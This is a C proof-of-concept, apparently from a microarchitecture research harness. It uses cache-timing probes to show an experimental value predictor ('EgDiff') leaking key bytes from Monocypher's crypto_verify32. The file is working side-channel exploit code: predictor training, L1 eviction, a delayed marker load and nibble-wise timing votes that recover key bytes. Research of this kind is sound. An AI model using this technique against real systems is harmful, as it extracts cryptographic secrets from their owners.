/*
 * Layer 6 / experiment A4 — EgDiff forwards a Monocypher crypto_verify32 key
 * byte across the call boundary.
 *
 * Threat model / measurement design
 * ---------------------------------
 *   - The key is a static object in target_verify32.c; this translation unit
 *     never names it.  target_verify32(guess) calls the real constant-time
 *     crypto_verify32(guess, key).  There is no early exit in verify32, so the
 *     key's 8 last byte loads (the last key word) always execute, and their
 *     dynamic load distances from the caller's next load are stable.
 *   - The attacker's own load `atk_load` is ONE static instruction used both
 *     for offline training and for the measurement.
 *   - Training generalises Mode 1 (poc_v1) from d = 1 to an arbitrary measured
 *     distance d: per iteration, execute d varying loads (the first is the
 *     carrier), then store the carrier's value into the marker buffer, then
 *     execute the marker load.  The marker is exactly d dynamic loads after the
 *     carrier, so `marker - carrier == 0` is constant at d and only at d; every
 *     other distance has a varying difference.  Distance polling therefore
 *     walks 32 -> ... -> d and latches diff = 0 there.
 *   - At measurement, the marker load's address is delayed by a register-only
 *     division chain, so its data access (verification + squash) happens long
 *     after dispatch while the dependent probe load issues immediately with the
 *     forwarded key byte.
 *   - The architectural (post-squash) value is a sentinel.  The probe routes it
 *     to a reserved slot LINES, outside the measured candidates, so the
 *     architectural re-execution is never a vote and no symbol is excluded.
 *   - Prefetcher-robust observation: a full 256-line scan is warmed ahead by the
 *     degree-4 L1 stride prefetcher, so the probe instead tests a nibble at a
 *     time.  The forwarded nibble selects one of 16 candidate lines spaced
 *     CAND_STRIDE (8) cache lines apart: a degree-4 prefetch window around one
 *     candidate cannot touch another.  Each attempt times all 16 candidates in
 *     a fixed pseudo-random order, so the scan never presents the stride
 *     prefetcher with a constant stride.  Two nibble passes recover the byte.  A byte is accepted only with
 *     >= MIN_VOTES votes and a 2x margin over the runner-up; otherwise its
 *     `known` bit is clear (never fabricated).  Both nibble passes always run,
 *     so the number of training/victim attempts does not depend on whether the
 *     predictor forwards anything.
 *   - `bare_attempt()` isolates the timing-critical train/evict/victim/probe
 *     sequence from the (large) estimator, and a medium-latency L3 load just
 *     before the victim call extends commit lag so the victim's key load is
 *     still in the speculative value queue when the marker dispatches (this is
 *     what makes d = 10..14 work with the L1 prefetcher enabled).
 *
 * Distances are *measured* in this binary by measure_d.py (qemu -singlestep
 * -d exec + objdump) and passed on the command line as `off:dist,...` pairs.
 */

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

extern int target_verify32(const uint8_t guess[32]);
extern int target_verify32_selfcheck(void);
extern int oracle_report_verify32(uint64_t recovered, uint64_t known_mask,
                                  int lane_base, int arch_ok, uint64_t sink);

/* ------------------------------------------------------------------------ */
/* Harness constants                                                         */
/* ------------------------------------------------------------------------ */
#define LINE      64
#define LINES     256                    /* measured byte lanes              */
#define SLOTS     (LINES + 1)            /* slot LINES = architectural path  */
#define PROBE_SZ  (SLOTS * LINE)
#ifndef TRAIN
#define TRAIN     256                    /* training-loop iterations         */
#endif
#ifndef REPS
#define REPS      16                     /* attempts per byte                */
#endif
#define MIN_VOTES 2
#define FLUSH_SZ  (512 * 1024)

#define SENTINEL  0xA5A5A5A5A5A5A5A5ULL
#define CAND_BASE 8
#define CAND_STRIDE 8
static int cand_order[16];

/* R5/R6 experiment switches.  COLD_KEY skips the selfcheck/two warm-up
 * target calls; VARY_GUESS changes the attacker's guess on every attempt. */
#ifndef COLD_KEY
#define COLD_KEY 0
#endif
#ifndef VARY_GUESS
#define VARY_GUESS 0
#endif
#ifndef ATK_DIVS
#define ATK_DIVS 12
#endif

static uint8_t probe[PROBE_SZ] __attribute__((aligned(LINE)));
static volatile uint64_t atk_buf[64] __attribute__((aligned(LINE)));
static volatile uint64_t carry_buf[8];
static volatile uint64_t noise[64];
static volatile uint8_t blocker_buf[64 * 1024] __attribute__((aligned(LINE)));
static volatile uint8_t flushbuf[FLUSH_SZ];

static uint8_t guess_buf[32];
static uint64_t g_sink;
static int g_arch_bad;

/* Compiled-in fallback mapping: offsets of the last key word vs. the distances
 * measured in the reference build (see RESULTS_A4.md).  run_layer6.sh always
 * passes the freshly measured pairs; this is only for manual runs. */
struct lane_spec {
    int off;
    int dist;
};
static const struct lane_spec fallback_lanes[8] = {
    {31, 7}, {30, 8}, {29, 9}, {28, 10}, {27, 11}, {26, 12}, {24, 13}, {25, 14}
};

static inline uint64_t
rdcycle(void)
{
    uint64_t c;
    asm volatile("csrrs %0, cycle, x0" : "=r"(c) :: "memory");
    return c;
}

static void
flush_l1(void)
{
    for (int i = 0; i < FLUSH_SZ; i += LINE)
        (void)flushbuf[i];
}

/* Drain the eviction loop's outstanding misses (see poc_v1): the eviction is a
 * stream of independent loads and its last misses can hold all L1D MSHRs when
 * the transient probe issues.  This fence is *before* the victim call, outside
 * the transient window. */
static inline void
flush_drain(void)
{
    asm volatile("fence.i" ::: "memory");
}

static inline uint64_t
time_line(int k)
{
    volatile uint8_t *q = probe + (size_t)k * LINE;
    uint64_t t1 = rdcycle();
    uint8_t v = *q;
    asm volatile("" :: "r"(v) : "memory");
    return rdcycle() - t1;
}

/* The attacker's load: one static PC for training and for the measurement.
 * The base is an argument, so addressing a global never inserts a hidden load
 * that would become the prediction base. */
__attribute__((noinline, noclone, noipa))
static uint64_t
atk_load(volatile uint64_t *base, uint64_t idx)
{
    return base[idx & 63];
}

/* Delay the marker's address with register-only divisions (no loads). */
__attribute__((noinline, noclone, noipa))
static uint64_t
delayed_atk_load(uint64_t token)
{
    uint64_t z = (token | 1) & 0xffffff;
    uint64_t dvs = z + 2;
    uint64_t x = z;
    asm volatile("" : "+r"(z), "+r"(dvs));
#if ATK_DIVS == 0
    x = 0;
#else
    asm volatile(
#if ATK_DIVS >= 1
        "divu %0, %0, %1\n\t"
#endif
#if ATK_DIVS >= 2
        "divu %0, %0, %1\n\t"
#endif
#if ATK_DIVS >= 3
        "divu %0, %0, %1\n\t"
#endif
#if ATK_DIVS >= 4
        "divu %0, %0, %1\n\t"
#endif
#if ATK_DIVS >= 5
        "divu %0, %0, %1\n\t"
#endif
#if ATK_DIVS >= 6
        "divu %0, %0, %1\n\t"
#endif
#if ATK_DIVS >= 7
        "divu %0, %0, %1\n\t"
#endif
#if ATK_DIVS >= 8
        "divu %0, %0, %1\n\t"
#endif
#if ATK_DIVS >= 9
        "divu %0, %0, %1\n\t"
#endif
#if ATK_DIVS >= 10
        "divu %0, %0, %1\n\t"
#endif
#if ATK_DIVS >= 11
        "divu %0, %0, %1\n\t"
#endif
#if ATK_DIVS >= 12
        "divu %0, %0, %1\n\t"
#endif
        : "+r"(x) : "r"(dvs));
#endif
    return atk_load(atk_buf, x);
}

/* One victim call followed by the marker.  This exact function is used both by
 * `measure` mode (so measure_d.py sees the attack's real distance) and by the
 * attack loop.  It contains no loads of its own. */
__attribute__((noinline, noclone, noipa))
static uint64_t
victim_then_marker(void)
{
    int r = target_verify32(guess_buf);
    asm volatile("" : "+r"(r));
    uint64_t v = delayed_atk_load((uint64_t)r);
    /* Keep this a real call (not a tail call): a tail call would make GCC
     * restore `ra` from the stack *between* the callee's ret and the marker,
     * inserting a load into the measured window. */
    asm volatile("" : "+r"(v));
    return v;
}

static uint64_t
mix(uint64_t x)
{
    x += 0x9E3779B97F4A7C15ULL;
    x = (x ^ (x >> 30)) * 0xBF58476D1CE4E5B9ULL;
    x = (x ^ (x >> 27)) * 0x94D049BB133111EBULL;
    return x ^ (x >> 31);
}

/* Generalised Mode 1 training at distance d.
 *
 *   carrier (varying)  L1
 *   noise (d-1 loads)  L2 .. Ld     all independently varying
 *   marker             L(d+1)       == value of L1
 *
 * Only distance d has a constant difference (0).  Stores to the marker buffer
 * between Ld and the marker do not advance EgDiff's load distance. */
__attribute__((noinline, noclone, noipa))
static void
train_at(int d, uint64_t *sinkp)
{
    uint64_t s = *sinkp;
    for (int i = 0; i < TRAIN; i++) {
        uint64_t v = mix((uint64_t)i + 0x51ED);
        asm volatile("" : "+r"(v));
        carry_buf[0] = v;
        s += carry_buf[0];              /* first of the d loads: carrier */
        for (int j = 0; j < d - 1; j++)
            s += noise[(i + j) & 63];   /* d-1 varying noise loads */
        atk_buf[0] = v;                 /* marker buffer := carrier value */
        s += atk_load(atk_buf, 0);      /* marker: distance d from carrier */
    }
    *sinkp = s;
}

static void
fill_guess(int variant)
{
    for (int i = 0; i < 32; i++)
        guess_buf[i] = (uint8_t)(variant
                                 ? (0x5a + i * 7 + variant * 13)
                                 : 0x00);
}

/* Critical path in its own compact function: train, evict, victim call, and
 * the dependent probe.  Keeping this out of the (large) estimator function
 * makes the dispatch/commit race independent of the observation code. */
__attribute__((noinline, noclone, noipa))
static uint64_t
bare_attempt(int dist, int shift)
{
    train_at(dist, &g_sink);
    for (int k = 0; k < 64; k++)
        atk_buf[k] = SENTINEL;
    flush_l1();
    flush_drain();
    g_sink += blocker_buf[0];      /* L3-resident: extend commit lag */
    uint64_t val = victim_then_marker();
    if (val != SENTINEL || atk_buf[0] != SENTINEL)
        g_arch_bad = 1;
    uint64_t nib = (val >> shift) & 0xf;
    uint64_t slot = (val == SENTINEL) ? (uint64_t)LINES
                                      : (uint64_t)(CAND_BASE + (int)nib * CAND_STRIDE);
    volatile uint8_t *pp = probe + (size_t)slot * LINE;
    g_sink += *pp;
    return val;
}

/* Recover one nibble forwarded from dynamic distance `dist`. */
static int
measure_nibble(int dist, int shift, int *votes_out, int *arch_ok_out)
{
    int score[16];
    int arch_ok = 1;
    for (int k = 0; k < 16; k++) score[k] = 0;

    for (int attempt = 0; attempt < REPS; attempt++) {
        g_arch_bad = 0;
        bare_attempt(dist, shift);
        if (g_arch_bad) arch_ok = 0;

        uint64_t lat[16];
        volatile uint8_t *base = probe + (size_t)CAND_BASE * LINE;
        for (int j = 0; j < 16; j++) {
            int k = cand_order[j];
            volatile uint8_t *q = base + (size_t)k * CAND_STRIDE * LINE;
            uint64_t t1 = rdcycle();
            uint8_t v = *q;
            asm volatile("" :: "r"(v) : "memory");
            lat[k] = rdcycle() - t1;
        }
        int cand = 0;
        for (int k = 1; k < 16; k++) if (lat[k] < lat[cand]) cand = k;
        int second = -1;
        for (int k = 0; k < 16; k++) {
            if (k == cand) continue;
            if (second < 0 || lat[k] < lat[second]) second = k;
        }
        if (lat[cand] + 8 <= lat[second]) score[cand]++;
    }

    int win = -1, best = 0, second = 0;
    for (int k = 0; k < 16; k++) {
        if (score[k] > best) { second = best; best = score[k]; win = k; }
        else if (score[k] > second) second = score[k];
    }
    int ok = (best >= MIN_VOTES && best >= 2 * second);
    printf("NIB d=%d shift=%d best=%d best_count=%d second_count=%d ok=%d\n",
           dist, shift, win, best, second, ok);
    *votes_out = ok ? best : 0;
    *arch_ok_out = arch_ok;
    return ok ? win : -1;
}

static int
measure_lane(int dist, int *votes_out, int *arch_ok_out)
{
    int vlo = 0, vhi = 0;
    /* Always run both nibble passes, even if one fails: the number of
     * training/victim attempts must not depend on whether EgDiff is enabled,
     * otherwise the architectural checksum would differ between controls. */
    int lo = measure_nibble(dist, 0, &vlo, arch_ok_out);
    int hi = measure_nibble(dist, 4, &vhi, arch_ok_out);
    *votes_out = (vlo < vhi) ? vlo : vhi;
    if (lo < 0 || hi < 0)
        return -1;
    return lo | (hi << 4);
}

static int
parse_lanes(const char *spec, struct lane_spec *lanes)
{
    int n = 0;
    const char *p = spec;
    while (n < 8 && *p) {
        char *end = NULL;
        long off = strtol(p, &end, 10);
        if (end == p || *end != ':')
            return -1;
        p = end + 1;
        long dist = strtol(p, &end, 10);
        if (end == p || (*end != ',' && *end != '\0'))
            return -1;
        lanes[n].off = (int)off;
        lanes[n].dist = (int)dist;
        n++;
        p = (*end == ',') ? end + 1 : end;
    }
    return n;
}

int
main(int argc, char **argv)
{
    for (int k = 0; k < 64; k++)
        atk_buf[k] = SENTINEL;
    for (int i = 0; i < 64; i++)
        noise[i] = mix((uint64_t)i + 0x77);
    memset(probe, 0, sizeof(probe));
    {
        uint32_t s = 0x51ed270bu;
        for (int i = 0; i < 16; i++) cand_order[i] = i;
        for (int i = 15; i > 0; i--) {
            s = s * 1664525u + 1013904223u;
            int j = (int)(s % (uint32_t)(i + 1));
            int t = cand_order[i]; cand_order[i] = cand_order[j]; cand_order[j] = t;
        }
    }

    /* ---- measurement mode: one real victim call + the real marker ---- */
    if (argc > 1 && strcmp(argv[1], "measure") == 0) {
        fill_guess(argc > 2 ? atoi(argv[2]) : 0);
        g_sink += victim_then_marker();
        printf("measure guess_variant=%d sink=%llu\n",
               argc > 2 ? atoi(argv[2]) : 0, (unsigned long long)g_sink);
        return 0;
    }

    /* ---- attack mode ---- */
    struct lane_spec lanes[8];
    int nlanes = 8;
    const char *source = "fallback";
    if (argc > 2 && strcmp(argv[1], "attack") == 0) {
        nlanes = parse_lanes(argv[2], lanes);
        if (nlanes != 8) {
            fprintf(stderr, "bad lane spec '%s' (want off:dist,... x8)\n",
                    argv[2]);
            return 2;
        }
        source = "measured";
    } else {
        for (int i = 0; i < 8; i++)
            lanes[i] = fallback_lanes[i];
    }

    fill_guess(0);

    /* Architectural precondition (experimenter side, before the measurement):
     * the target is self-consistent and deterministic for a fixed guess.
     * COLD_KEY skips the two warm-up calls and the key-reading selfcheck. */
#if COLD_KEY
    int self_ok = 1;
    int repro = 1;
#else
    int self_ok = (target_verify32_selfcheck() == 0);
    int r1 = target_verify32(guess_buf);
    int r2 = target_verify32(guess_buf);
    int repro = (r1 == r2);
#endif

    uint64_t recovered = 0, known = 0;
    int arch_all = 1;

    printf("poc_verify32 distances=%s ", source);
    for (int i = 0; i < nlanes; i++)
        printf("%c%d", i ? ',' : ' ', lanes[i].dist);
    printf("\n");

    for (int i = 0; i < nlanes; i++) {
        int votes = 0, arch_ok = 0;
        int byte = measure_lane(lanes[i].dist, &votes, &arch_ok);
        int bit = lanes[i].off - 24;

        arch_all &= arch_ok;
        if (byte >= 0 && bit >= 0 && bit < 8) {
            recovered |= ((uint64_t)(uint8_t)byte) << (8 * bit);
            known |= 1ULL << bit;
        }
        printf("lane key_off=%d d=%d %s=0x%02x votes=%d\n", lanes[i].off,
               lanes[i].dist, byte >= 0 ? "got" : "UNKNOWN",
               byte >= 0 ? byte : 0, votes);
    }

    int arch_ok = arch_all && repro && self_ok;

    printf("poc_verify32 archpre self=%s repro=%s marker=%s\n",
           self_ok ? "OK" : "BAD", repro ? "OK" : "BAD",
           arch_all ? "OK" : "BAD");

    return oracle_report_verify32(recovered, known, 24, arch_ok, g_sink);
}
